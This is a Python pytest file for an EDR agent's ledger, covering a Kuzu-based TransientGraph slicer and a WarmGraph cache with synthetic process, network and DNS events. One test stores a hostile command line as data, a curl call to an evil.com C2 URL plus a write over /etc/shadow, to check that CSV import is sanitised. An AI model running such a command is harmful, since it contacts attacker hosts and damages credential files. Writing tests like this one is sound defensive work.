"""Tests for TransientGraph slicer and WarmGraph warm cache."""

from __future__ import annotations

import gc
import os
import tempfile
import time
from datetime import datetime

import pytest

from agent.ledger.reader import LedgerReader
from agent.ledger.slicer import TransientGraph
from agent.ledger.warm_cache import WarmGraph
from agent.ledger.writer import LedgerWriter
from agent.processor.entity_extractor import ExtractedEntities
from agent.schema.graph_types import (
    DomainNode,
    IpNode,
    ProcessNode,
    UserNode,
)
from agent.schema.ocsf_types import (
    DeviceInfo,
    DnsActivity,
    NetworkActivity,
    NetworkEndpoint,
    ProcessActivity,
    ProcessInfo,
)

# ── Helpers ──


def _now():
    return datetime.now()


def _make_process_event(pid: int = 1234, name: str = "bash", parent_pid: int = 1):
    ocsf = ProcessActivity(
        activity_id=1,
        time=_now(),
        process=ProcessInfo(pid=pid, name=name, cmd_line=f"{name} -l", parent_pid=parent_pid),
        device=DeviceInfo(hostname="test-host"),
    )
    entities = ExtractedEntities()
    now = _now()
    entities.processes.append(ProcessNode(
        id=f"test-host:{pid}:0", name=name, pid=pid,
        hostname="test-host", start_time=now, parent_pid=parent_pid,
    ))
    entities.users.append(UserNode(id="root", name="root", first_seen=now, last_seen=now))
    return ocsf, entities


def _make_network_event(pid: int = 5678, ip: str = "93.184.216.34", port: int = 443):
    ocsf = NetworkActivity(
        activity_id=1,
        time=_now(),
        process=ProcessInfo(pid=pid, name="curl"),
        dst_endpoint=NetworkEndpoint(ip=ip, port=port),
        device=DeviceInfo(hostname="test-host"),
    )
    entities = ExtractedEntities()
    now = _now()
    entities.processes.append(ProcessNode(
        id=f"test-host:{pid}:0", name="curl", pid=pid,
        hostname="test-host", start_time=now,
    ))
    entities.ips.append(IpNode(
        id=ip, address=ip, is_private=False, first_seen=now, last_seen=now,
    ))
    entities.connected_edges.append({
        "process_id": f"test-host:{pid}:0", "ip_id": ip,
        "timestamp": now, "dst_port": port, "protocol": "TCP",
        "direction": "outbound", "event_id": 1,
    })
    return ocsf, entities


def _make_dns_event():
    ocsf = DnsActivity(
        activity_id=1,
        time=_now(),
        process=ProcessInfo(pid=9999, name="dig"),
        query_domain="example.com",
        resolved_ips=["93.184.216.34"],
        device=DeviceInfo(hostname="test-host"),
    )
    entities = ExtractedEntities()
    now = _now()
    entities.processes.append(ProcessNode(
        id="test-host:9999:0", name="dig", pid=9999,
        hostname="test-host", start_time=now,
    ))
    entities.domains.append(DomainNode(
        id="example.com", name="example.com", first_seen=now, last_seen=now,
    ))
    return ocsf, entities


def _populate_ledger(tmp_path, events):
    """Write events to ledger and return a LedgerReader."""
    writer = LedgerWriter(tmp_path)
    for i, (ocsf, entities) in enumerate(events):
        writer.record(ocsf, entities, event_id=i)
    time.sleep(1.5)
    writer.stop()
    return LedgerReader(tmp_path)


# ── TransientGraph Tests ──


class TestTransientGraph:
    def test_builds_from_ledger_and_queries(self, tmp_path):
        """TransientGraph builds a Kuzu graph from ledger data and supports queries."""
        events = [_make_process_event(pid=100, name="sshd")]
        reader = _populate_ledger(tmp_path, events)

        now = time.time()
        with TransientGraph(reader, now - 60, now + 60, buffer_pool_mb=128) as conn:
            result = conn.execute("MATCH (p:Process) RETURN p.pid, p.name")
            rows = []
            while result.has_next():
                rows.append(result.get_next())
            assert len(rows) == 1
            assert rows[0][0] == 100
            assert rows[0][1] == "sshd"

    def test_multiple_entity_types(self, tmp_path):
        """TransientGraph handles process, network, and DNS entities."""
        events = [
            _make_process_event(pid=100, name="bash"),
            _make_network_event(pid=200, ip="10.0.0.1", port=80),
            _make_dns_event(),
        ]
        reader = _populate_ledger(tmp_path, events)

        now = time.time()
        with TransientGraph(reader, now - 60, now + 60, buffer_pool_mb=128) as conn:
            # Check processes
            result = conn.execute("MATCH (p:Process) RETURN p.pid ORDER BY p.pid")
            pids = []
            while result.has_next():
                pids.append(result.get_next()[0])
            assert 100 in pids
            assert 200 in pids
            assert 9999 in pids

            # Check IPs
            result = conn.execute("MATCH (i:IP) RETURN i.address")
            ips = []
            while result.has_next():
                ips.append(result.get_next()[0])
            assert "10.0.0.1" in ips

            # Check domains
            result = conn.execute("MATCH (d:Domain) RETURN d.name")
            domains = []
            while result.has_next():
                domains.append(result.get_next()[0])
            assert "example.com" in domains

    def test_edges_created(self, tmp_path):
        """TransientGraph creates relationship edges."""
        events = [_make_network_event(pid=300, ip="1.2.3.4", port=8080)]
        reader = _populate_ledger(tmp_path, events)

        now = time.time()
        with TransientGraph(reader, now - 60, now + 60, buffer_pool_mb=128) as conn:
            result = conn.execute(
                "MATCH (p:Process)-[c:CONNECTED_TO]->(i:IP) "
                "RETURN p.pid, i.address, c.dst_port"
            )
            rows = []
            while result.has_next():
                rows.append(result.get_next())
            assert len(rows) == 1
            assert rows[0][0] == 300
            assert rows[0][1] == "1.2.3.4"
            assert rows[0][2] == 8080

    def test_tmpdir_cleaned_up(self, tmp_path):
        """Tmpdir is removed after context exit."""
        gc.collect()  # Free Kuzu buffer pools from prior tests
        events = [_make_process_event()]
        reader = _populate_ledger(tmp_path, events)

        now = time.time()
        with TransientGraph(reader, now - 60, now + 60, buffer_pool_mb=128):
            # Find the tmpdir from the graph's internal state
            pass

        # After exit, edr-kuzu-* tmpdirs in system temp should be cleaned
        # (We can't easily check the exact tmpdir, but we verify no crash)
        # The real verification is that __exit__ completes without error

    def test_empty_ledger(self, tmp_path):
        """TransientGraph with empty ledger creates empty graph."""
        writer = LedgerWriter(tmp_path)
        writer.stop()
        reader = LedgerReader(tmp_path)

        now = time.time()
        with TransientGraph(reader, now - 60, now + 60, buffer_pool_mb=128) as conn:
            result = conn.execute("MATCH (p:Process) RETURN count(p)")
            assert result.get_next()[0] == 0

    def test_time_window_filters(self, tmp_path):
        """TransientGraph only includes events within the time window."""
        events = [_make_process_event(pid=100, name="early")]
        reader = _populate_ledger(tmp_path, events)

        # Query a future window that excludes the written events
        future = time.time() + 3600
        with TransientGraph(reader, future, future + 60, buffer_pool_mb=128) as conn:
            result = conn.execute("MATCH (p:Process) RETURN count(p)")
            assert result.get_next()[0] == 0

    def test_entity_roundtrip_fidelity(self, tmp_path):
        """Entities written to ledger and rebuilt in graph match originals."""
        ocsf, entities = _make_process_event(pid=42, name="python3")
        reader = _populate_ledger(tmp_path, [(ocsf, entities)])

        now = time.time()
        with TransientGraph(reader, now - 60, now + 60, buffer_pool_mb=128) as conn:
            result = conn.execute(
                "MATCH (p:Process) WHERE p.pid = 42 RETURN p.name, p.hostname, p.parent_pid"
            )
            row = result.get_next()
            assert row[0] == "python3"
            assert row[1] == "test-host"
            assert row[2] == 1


    def test_adversarial_cmdline_commas_and_newlines(self, tmp_path):
        """Cmd_line with commas, newlines, and quotes must not break CSV import."""
        # Simulate adversary-crafted process names that break naive CSV parsing
        adversarial_cmd = (
            'bash -c "curl http://evil.com/c2,callback\n'
            'echo pwned > /etc/shadow"\r\n'
            '--flag="injected,column"'
        )
        ocsf = ProcessActivity(
            activity_id=1,
            time=_now(),
            process=ProcessInfo(
                pid=6666, name="bash", cmd_line=adversarial_cmd, parent_pid=1,
            ),
            device=DeviceInfo(hostname="test-host"),
        )
        entities = ExtractedEntities()
        now = _now()
        entities.processes.append(ProcessNode(
            id="test-host:6666:0", name="bash", pid=6666,
            cmd_line=adversarial_cmd, hostname="test-host",
            start_time=now, parent_pid=1,
        ))
        entities.users.append(UserNode(
            id="attacker", name="attacker", first_seen=now, last_seen=now,
        ))
        reader = _populate_ledger(tmp_path, [(ocsf, entities)])

        t = time.time()
        with TransientGraph(reader, t - 60, t + 60, buffer_pool_mb=128) as conn:
            result = conn.execute(
                "MATCH (p:Process) WHERE p.pid = 6666 "
                "RETURN p.name, p.cmd_line, p.hostname"
            )
            row = result.get_next()
            assert row[0] == "bash"
            # Newlines stripped by _san(), commas preserved inside quoted field
            assert "curl http://evil.com/c2,callback" in row[1]
            assert "\n" not in row[1]
            assert "\r" not in row[1]
            assert row[2] == "test-host"

    def test_sanitize_function(self):
        """_san strips newlines and NUL bytes."""
        from agent.ledger.reader import _san

        assert _san("normal") == "normal"
        assert _san("line1\nline2") == "line1 line2"
        assert _san("line1\r\nline2") == "line1 line2"
        assert _san("has\x00null") == "hasnull"
        assert _san(None) == ""
        assert _san(12345) == "12345"
        # Commas and quotes preserved (handled by CSV quoting)
        assert _san('say "hello", world') == 'say "hello", world'


# ── WarmGraph Tests ──


class TestWarmGraph:
    def test_start_and_get_connection(self, tmp_path):
        """WarmGraph starts, builds, and returns a connection."""
        events = [_make_process_event(pid=500, name="agent")]
        reader = _populate_ledger(tmp_path, events)

        warm = WarmGraph(reader, window_hours=1.0, rebuild_interval_s=600.0, buffer_pool_mb=128)
        try:
            warm.start()
            warm.wait_ready(timeout=30.0)
            conn = warm.get_connection()
            result = conn.execute("MATCH (p:Process) RETURN p.pid, p.name")
            rows = []
            while result.has_next():
                rows.append(result.get_next())
            assert len(rows) == 1
            assert rows[0][0] == 500
            assert rows[0][1] == "agent"
        finally:
            warm.stop()

    def test_get_connection_before_start_raises(self, tmp_path):
        """get_connection() raises RuntimeError before start()."""
        writer = LedgerWriter(tmp_path)
        writer.stop()
        reader = LedgerReader(tmp_path)

        warm = WarmGraph(reader)
        with pytest.raises(RuntimeError, match="not initialized"):
            warm.get_connection()

    def test_stop_cleans_up(self, tmp_path):
        """stop() cleans up tmpdir and connection."""
        events = [_make_process_event()]
        reader = _populate_ledger(tmp_path, events)

        warm = WarmGraph(reader, window_hours=1.0, rebuild_interval_s=600.0, buffer_pool_mb=128)
        warm.start()
        warm.wait_ready(timeout=30.0)
        warm.stop()

        # After stop, get_connection should fail
        with pytest.raises(RuntimeError):
            warm.get_connection()

    def test_rebuild_updates_connection(self, tmp_path):
        """After a rebuild, the connection reflects the latest data."""
        gc.collect()  # Free Kuzu buffer pools from prior tests
        # Start with one event
        writer = LedgerWriter(tmp_path)
        ocsf1, ent1 = _make_process_event(pid=100, name="first")
        writer.record(ocsf1, ent1, event_id=0)
        time.sleep(1.5)
        writer.stop()

        reader = LedgerReader(tmp_path)
        warm = WarmGraph(reader, window_hours=1.0, rebuild_interval_s=600.0, buffer_pool_mb=128)
        try:
            warm.start()
            warm.wait_ready(timeout=30.0)

            # First build shows 1 process
            conn = warm.get_connection()
            result = conn.execute("MATCH (p:Process) RETURN count(p)")
            assert result.get_next()[0] == 1

            # Add another event to the ledger
            writer2 = LedgerWriter(tmp_path)
            ocsf2, ent2 = _make_process_event(pid=200, name="second")
            writer2.record(ocsf2, ent2, event_id=1)
            time.sleep(1.5)
            writer2.stop()

            # Force a rebuild
            warm._rebuild()

            # New connection should show 2 processes
            conn2 = warm.get_connection()
            result2 = conn2.execute("MATCH (p:Process) RETURN count(p)")
            assert result2.get_next()[0] == 2
        finally:
            warm.stop()

    def test_concurrent_reads_safe(self, tmp_path):
        """Multiple threads can call get_connection() safely."""
        import threading

        events = [_make_process_event(pid=i, name=f"proc-{i}") for i in range(10)]
        reader = _populate_ledger(tmp_path, events)

        warm = WarmGraph(reader, window_hours=1.0, rebuild_interval_s=600.0, buffer_pool_mb=128)
        errors = []

        def reader_thread():
            try:
                conn = warm.get_connection()
                result = conn.execute("MATCH (p:Process) RETURN count(p)")
                count = result.get_next()[0]
                assert count > 0
            except Exception as e:
                errors.append(e)

        try:
            warm.start()
            warm.wait_ready(timeout=30.0)

            threads = [threading.Thread(target=reader_thread) for _ in range(5)]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=10.0)

            assert not errors, f"Concurrent read errors: {errors}"
        finally:
            warm.stop()

    def test_stale_tmpdir_cleanup(self, tmp_path):
        """_cleanup_stale_tmpdirs removes old edr-kuzu-* dirs."""
        tmpdir_root = tempfile.gettempdir()
        stale_dir = tempfile.mkdtemp(prefix="edr-kuzu-", dir=tmpdir_root)
        # Set mtime to 2 hours ago
        old_time = time.time() - 7200
        os.utime(stale_dir, (old_time, old_time))

        WarmGraph._cleanup_stale_tmpdirs()

        assert not os.path.exists(stale_dir)
